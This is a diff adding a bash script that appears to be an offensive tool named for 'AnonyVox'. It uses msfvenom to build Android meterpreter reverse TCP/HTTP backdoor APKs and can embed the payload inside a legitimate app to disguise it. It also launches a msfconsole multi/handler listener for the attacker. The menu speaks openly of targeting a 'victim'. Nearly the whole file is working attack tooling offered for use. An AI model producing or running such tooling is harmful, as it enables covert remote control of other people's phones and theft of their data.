@@ -1,0 +1,231 @@
+#!/bin/bash
+
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
+## Environment
+
+if [ -d "/data/data/com.termux/files/home"  ];then
+
+echo ${RED}"This Tool is For Debian/Kali/Ubuntu only"
+echo ${RED}"Please upgrade from Termux"
+exit 0
+fi
+## Dependencies
+	clear
+	echo ${ORANGE}"Checking for ${BLUE}Dependencies${ORANGE}..."
+	sleep 5
+	if [[ `command -v msfconsole` && `command -v java` && `command -v apktool` &&  `command -v zipalign` ]]; then
+	echo ""
+	echo ${ORANGE}"All ${BLUE}Dependencies ${ORANGE}already installed"
+	echo ""
+	sleep 5
+	clear
+	else
+	echo ${RED}"Please install all dependencies by executing setup.sh eg. ${BLUE}'bash setup.sh'"
+	exit 0
+	fi
+## Start Listener
+Listener(){
+
+echo ${ORANGE}"Do you want to open Multi Handler Listener for the above generated payload? (y or n) :${BLUE}"
+
+read lisn
+	case $lisn in 
+	[yY]) echo ${ORANGE}"opening multi handler meterpreter"
+
+		echo ${WHITE}""
+
+	echo ${GREEN}"Is the Payload (http/tcp)"
+
+	read type
+
+	echo ""
+
+	echo ${GREEN}"Enter LHOST for msfconsole:"
+
+	read lhostt
+
+	echo ""
+
+	echo ${GREEN}"Enter LPORT for msfconsole"
+
+	read lportt
+
+	   msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_$type; set LHOST $lhostt; set LPORT $lportt; set ReverseListenerBindAdress localhost; exploit"
+	   ;;
+	  [nN]) echo ${RED}"bubye"
+	   exit 0
+	   ;;
+	*) echo ${RED}"Unknown Command"
+           exit 0 
+	   ;;
+	esac
+}
+
+## Options
+
+exitt(){
+
+	echo ${RED}"Thank You For Using Remote Tool"
+	echo ${RED}"To Contact Owner: ${BLUE}t.me/AnonyVox1"
+	exit 0
+}
+
+sign(){
+
+        echo ${ORANGE}"Signing Final APK"
+
+        echo ${WHITE}"..."
+
+	zipalign -v 4 backdoor.apk backdoor-signed.apk
+	rm backdoor.apk && mv backdoor-signed.apk $name.apk && mv $name.apk $HOME
+	echo ""
+	echo ${ORANGE}"Created and it's on the home Directory as ${BLUE}${name}.apk${ORANGE}"
+	sleep 5
+}
+
+
+tcp(){
+
+	read -p ${ORANGE}"Enter your Local IP or Portforwarding domain: ${BLUE}" lhost
+
+	echo ""
+
+	read -p ${ORANGE}"Enter your LocalPort or PortForwardingPort : ${BLUE}" lport
+
+	echo ""
+
+	read -p ${ORANGE}"Enter a name of the Final name of the APK: ${BLUE}" name
+
+	echo ""
+
+	echo ${WHITE}"Generating, please wait..."
+
+	msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > backdoor.apk
+
+	echo ""
+
+	sign
+
+	Listener
+
+}
+
+http(){
+
+	read -p ${ORANGE}"Enter your Local IP or Portforwarding domain: ${BLUE}" lhost
+
+	echo ""
+
+	read -p ${ORANGE}"Enter your LocalPort or PortForwardingPort : ${BLUE}" lport
+
+	echo ""
+
+	read -p ${ORANGE}"Enter a name of the Final name of the APK: ${BLUE}" name
+
+	echo ""
+
+	echo ${WHITE}"Generating, please wait..."
+
+	msfvenom -p android/meterpreter/reverse_http lhost=$lhost lport=$lport R > backdoor.apk
+
+	sign
+
+	Listener
+
+}
+
+
+inject(){
+
+	read -p ${ORANGE}"Path of the apk to Embed(Incuding the Actual APK): ${BLUE}" legit
+
+	echo ""
+
+	read -p ${ORANGE}"Embed with (http/tcp): ${BLUE}" protocol
+
+	echo ""
+
+	read -p ${ORANGE}"Enter your Local IP or Portforwarding domain: ${BLUE}" lhost
+
+	echo ""
+
+        read -p ${ORANGE}"Enter your LocalPort or PortForwardingPort : ${BLUE}" lport
+
+        echo ""
+
+        read -p ${ORANGE}"Enter a name of the Final name of the APK: ${BLUE}" name
+
+        echo ""
+
+        echo ${WHITE}"Injecting Payload to APK, please wait..."
+
+	msfvenom -x $legit -p android/meterpreter/reverse_$protocol lhost=$lhost lport=$lport R > backdoor.apk
+	mv backdoor.apk $name.apk && mv $name.apk $HOME
+
+	echo ""
+	echo ${ORANGE}"Payload Injection Complete..."
+	echo ""
+	echo ${ORANGE}"Injected and it's on the home Directory as ${BLUE}${name}.apk${ORANGE}"
+
+	sleep 5
+	Listener
+}
+
+
+## Menu
+
+menu(){
+
+	echo ${BLUE}' _______                      __                            __ 
+|       \                    |  \ AnonyVox                 |  \
+| $$$$$$$\ ______   __    __ | $$  ______    ______    ____| $$
+| $$__/ $$|      \ |  \  |  \| $$ /      \  |      \  /      $$
+| $$    $$ \$$$$$$\| $$  | $$| $$|  $$$$$$\  \$$$$$$\|  $$$$$$$
+| $$$$$$$ /      $$| $$  | $$| $$| $$  | $$ /      $$| $$  | $$ AnonyVox
+| $$     |  $$$$$$$| $$__/ $$| $$| $$__/ $$|  $$$$$$$| $$__| $$
+| $$      \$$    $$ \$$    $$| $$ \$$    $$ \$$    $$ \$$    $$
+ \$$       \$$$$$$$ _\$$$$$$$ \$$  \$$$$$$   \$$$$$$$  \$$$$$$$
+                   |  \__| $$
+                    \$$    $$ AnonyVox
+                     \$$$$$$' 
+echo ${GREEN}"Author - ${RED}AnonyVox"
+
+echo ${GREEN}"Contributor - ${RED}Hacking ${RED}Expect"
+echo ""
+echo ""
+sleep 2
+	echo "${RED}[${WHITE}::${RED}]${ORANGE} Select A Payload Type For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}" 
+	echo"" 
+	echo "${RED}[${WHITE}01${RED}]${ORANGE} TCP Payload"
+	echo "${RED}[${WHITE}02${RED}]${ORANGE} HTTP Payload"
+	echo "${RED}[${WHITE}03${RED}]${ORANGE} Embed Payload to APK"
+	echo "${RED}[${WHITE}04${RED}]${ORANGE} Exit"
+	echo ""
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" 
+	echo ""
+	case $REPLY in
+
+	1 | 01)
+		tcp;;
+	2 | 02)
+		http;; 
+	3 | 03)
+		inject;; 
+	4 | 04)
+		exitt;;
+
+	*) 
+		echo ${RED}"Invalid" 
+		menu
+	 esac
+}
+
+menu 
+
+## Author - AnonyVox
